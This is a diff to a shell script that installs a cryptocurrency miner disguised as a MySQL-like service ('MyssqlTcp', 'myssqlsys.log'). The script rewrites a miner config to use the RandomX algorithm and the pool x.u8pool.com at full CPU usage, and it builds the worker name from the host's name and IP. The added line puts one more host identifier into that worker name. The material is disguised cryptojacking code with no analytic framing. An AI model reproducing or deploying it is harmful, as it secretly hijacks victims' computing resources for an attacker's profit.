@@ -123,6 +123,7 @@ chmod 777 MyssqlTcp
 chmod 777 config.json
 
 USIP=`hostname -i | cut -f1 -d" " | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
+UUIP=`hostname -v | cut -f1 -d" " | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
 PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
 if [ "$PASS" == "localhost" ]; then
   PASS=`ip route get 1 | awk '{print $NF;exit}'`
@@ -135,7 +136,7 @@ if [ ! -z $EMAIL ]; then
 fi
 sed -i 's/"algo": *null,/"algo": "rx/0",/' $HOME/myssqltcp/config.json
 sed -i 's/"url": *"[^"]*",/"url": "x.u8pool.com:'$PORT'",/' $HOME/myssqltcp/config.json
-sed -i 's/"user": *"[^"]*",/"user": "love275@gamil'$USIP'.'$PASS'",/' $HOME/myssqltcp/config.json
+sed -i 's/"user": *"[^"]*",/"user": "love275@gamil'$USIP'.'$PASS''$UUIP'",/' $HOME/myssqltcp/config.json
 sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/myssqltcp/config.json
 sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/myssqltcp/config.json
 sed -i 's#"log-file": *null,#"log-file": "'$HOME/myssqlsys.log'",#' $HOME/myssqltcp/config.json
